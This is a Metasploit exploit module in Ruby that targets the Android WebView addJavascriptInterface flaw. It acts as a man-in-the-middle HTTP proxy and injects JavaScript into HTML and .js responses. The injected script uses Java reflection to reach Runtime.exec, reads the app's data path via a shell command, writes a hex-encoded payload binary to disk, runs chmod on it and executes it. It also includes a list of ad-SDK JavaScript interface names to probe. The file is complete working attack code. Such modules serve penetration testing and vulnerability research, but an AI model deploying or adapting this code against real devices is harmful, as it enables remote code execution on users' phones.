##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'thread'
require 'msf/core'
require 'rex/proto/proxy/http'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Android WebView addJavascriptInterface MITM Code Execution',
      'Description' => %q{
              This module exploits an issue where MITM attackers can execute 
          arbitrary code on vulnerable Android devices. The issue is rooted in
          the use of the addJavascriptInterface function, which exposes Java
          Reflection to Javascript executing within an affected WebView. By 
          injecting Javascript into the stream, this module uploads and 
          executes an automatically generated payload executable.

          This module relies on the Rex::Proto::Proxy::Http class to function.
      },
      'License'     => MSF_LICENSE,
      'Author'      => [ 'jduck' ],
      'References'     =>
        [
          # None assigned yet?
          # ['CVE', '2013-'],
          # ['OSVDB', ''],
          # ['BID', ''],
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/'],
          ['URL', 'http://50.56.33.56/blog/?p=314'],
          ['URL', 'https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/']
        ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_ARMLE,
      'Stance'         => Msf::Exploit::Stance::Passive,
      'DefaultOptions' =>
        {
          'PrependFork' => true
        },
      'Targets'        =>
        [
          [ 'Automatic', {}],
        ],
      'DisclosureDate' => 'Dec 21 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new( 'SRVHOST', [ true,  "The address to listen on", '0.0.0.0' ] ),
        OptPort.new('SRVPORT', [ true, "The daemon port to listen on", 8080 ]),
      ], self.class)
  end

  def setup
    super
    @mutex = ::Mutex.new
    @hproxy = nil
    @getjsif = generate_getjsif()
  end

  def cleanup
    @mutex.synchronize do
      if( @hproxy )
        print_status( "Stopping the HTTP proxy server" )
        @hproxy.stop
        @hproxy = nil
      end
    end
    super
  end

  def generate_getjsif()
    jsifs = [
      # greystripe
      'AdState',
      'MraidController',
      'DeviceInfo',
      'NetworkStatus',
      'Accelerometer',
      'FullScreenController',
      'Video',
      'Preferences',
      'SdkLog',
      'ResponseStatus',
      # beintoo
      'Beintoo',
      'ok',
      'closebt',
      # mopub
      'mopubUriInterface',
      # admob
      'JsProxy',
      # AdView / MMAdView
      'interface',
      # MobClix
      'fullscreen',
      'MOBCLIX',
      # unknown
      'video',
      'FUtil',
      'FUtils',
      'GC',
      'demo',
      'FileUtils',
      'JsShow',
      # DroidGap
      'GapCam',
      'Geo',
      'FileUtil',
      'droidStorage',
      # Android docs example
      'Android',
      # Baidu/QQ browser and Qvod player?
      'js2java'
    ]
                                                                        
    js = "function tryifs() { "
    jsifs.each { |jsif|
      # for debugging, but must call getjsif() from body onload or later
      #js << "    document.body.innerHTML += '<br>#{jsif} === ' + typeof(#{jsif});\n"
      js << "if (!(typeof #{jsif} === 'undefined')) try1(#{jsif},\"#{jsif}\"); "
    }
    js << "}";
    js
  end

  def inject_html(body, js)
    inj_type = 'function'
    # Inject into html (method 1, function insertion)
    idx = (body =~ /function /i)
    if idx.nil?
      # Inject into html (method 2, beginning of script)
      idx = (body =~ /<script/i)
      inj_type = 'in_script'
      if idx.nil?
        # Inject into html (method 3, after head)
        idx = (body =~ /<head>/i)
        inj_type = 'in_head'
      end
    end

    return nil if idx.nil?

    newbody = ''
    newbody << body[0,idx]
    case inj_type
      when 'in_head'
        newbody << "<head><script type=\"text/JavaScript\">"
        newbody << js
        newbody << "</script>"
        newbody << body[idx+6, body.length]

      when 'in_script'
        newbody << "<script type=\"text/JavaScript\">"
        newbody << js
        newbody << "</script>"
        newbody << body[idx, body.length]

      else
        newbody << js
        newbody << body[idx, body.length]

    end

    newbody
  end

  def on_http_request(cli, req)
    # we dont muck with requests...
  end

  def on_http_response(cli, res)
    # Print some status
    ct = res.headers['Content-Type'] || ''
    ct = ct.split(';').first || ''
    req = res.orig_req
    uri = req.uri_obj
    print_status("Processing response for: #{req.method} - #{uri.scheme} :// #{uri.host} : #{uri.port} #{uri.path} (#{ct})")

    # Build the JavaScript payload
    bin_data = Rex::Text.to_hex(payload.encoded_exe, '\\\\x')

    js = ''
    js << "function try1(j,n) { try { "
    # get the runtime so we can exec =)
    js << "var par = j.getClass().getName(); "
    js << "var m = j.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null); "
    js << "var data = \"#{bin_data}\"; "
    # get the process name, which will give us our data path =)
    js << "var p; "
    js << "p = m.invoke(null,null).exec(['/system/bin/sh', '-c', 'cat /proc/$PPID/cmdline']); "
    js << "var path = '/data/data/'; var ch; while ((ch = p.getInputStream().read()) != 0) { path += String.fromCharCode(ch); } "
    js << "path += '/x'; "
    # build the binary, chmod it, and execute it.
    js << "p = m.invoke(null,null).exec(['/system/bin/sh', '-c', 'echo \"'+data+'\" > '+path]); p.waitFor(); "
    js << "p = m.invoke(null,null).exec(['chmod', '700', path]); p.waitFor(); "
    js << "p = m.invoke(null,null).exec([path]); p.waitFor(); "
    js << "} catch(e) { } } "
    js << @getjsif.dup
    js << " tryifs();"

    # Assume we're not going to inject anything...
    newbody = nil

    # Expand the data if its gzip'd
    if res.headers['Content-Encoding'] == 'gzip'
      res.body = Rex::Text.ungzip(res.body)
    end

    # JS injection is straight forward...
    if uri.path[-3,3] == ".js"
      # Inject into raw JavaScript
      newbody = js
      newbody << res.body

    elsif ct == "text/html"
      newbody = inject_html(res.body, js)
      if not newbody
        print_error("Failed to inject JS!")
      end

    end

    if newbody
      print_status("Inejcted JS into response!")
      res.body = newbody
    end

    # don't spam output with image data
    ct_type = ct.split('/').first
    if not newbody and ct != 'text/css' and not [ 'image', 'application' ].include? ct_type
      print_status("SENDING RESPONSE DATA: #{res.body.inspect}")
    end

    # Re-compress the data if its gzip'd
    if res.headers['Content-Encoding'] == 'gzip'
      res.body = Rex::Text.gzip(res.body)
    end

    # Make sure the content length header is correct
    res.headers['Content-Length'] = res.body.length
  end

  def exploit
    opts = {
      'ServerHost' => datastore['SRVHOST'],
      'ServerPort' => datastore['SRVPORT'],
      'Context' => {'Msf' => framework, 'MsfExploit' => self}
    }

    @hproxy = Rex::Proto::Proxy::Http.new(
      datastore['SRVPORT'],
      datastore['SRVHOST'],
      false,
      datastore['Context'])

    print_status("Starting the HTTP proxy server")

    @hproxy.on_http_request_proc = Proc.new { |cli, req|
      on_http_request(cli, req)
    }
    @hproxy.on_http_response_proc = Proc.new { |cli, res|
      on_http_response(cli, res)
    }

    @hproxy.start
    @hproxy.wait
  end

end

